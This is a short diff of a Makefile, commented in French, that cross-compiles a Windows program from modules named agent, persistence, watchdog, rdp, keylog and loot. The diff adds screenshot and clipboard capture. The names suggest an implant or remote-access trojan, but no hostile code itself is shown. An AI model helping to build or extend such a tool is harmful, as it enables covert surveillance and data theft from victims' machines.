@@ -11,8 +11,8 @@ CC = x86_64-w64-mingw32-gcc
 WINDRES = x86_64-w64-mingw32-windres
 
 # Fichiers source
-SOURCES = agent.c persistence.c watchdog.c rdp.c keylog.c loot.c
-HEADERS = persistence.h watchdog.h rdp.h keylog.h loot.h
+SOURCES = agent.c persistence.c watchdog.c rdp.c keylog.c loot.c screenshot.c clipboard.c
+HEADERS = persistence.h watchdog.h rdp.h keylog.h loot.h screenshot.h clipboard.h
 OBJECTS = $(SOURCES:.c=.o)
 
 # Nom de l'exécutable
@@ -26,7 +26,7 @@ CFLAGS_DEBUG = -g -DDEBUG
 CFLAGS = $(CFLAGS_BASE)
 
 # Flags de link
-LDFLAGS = -lwininet -lws2_32 -lshlwapi -lole32 -luuid -Wl,--gc-sections
+LDFLAGS = -lwininet -lws2_32 -lshlwapi -lole32 -luuid -lshell32 -lgdi32 -Wl,--gc-sections
 
 # ============================================================================
 # RÈGLES PRINCIPALES
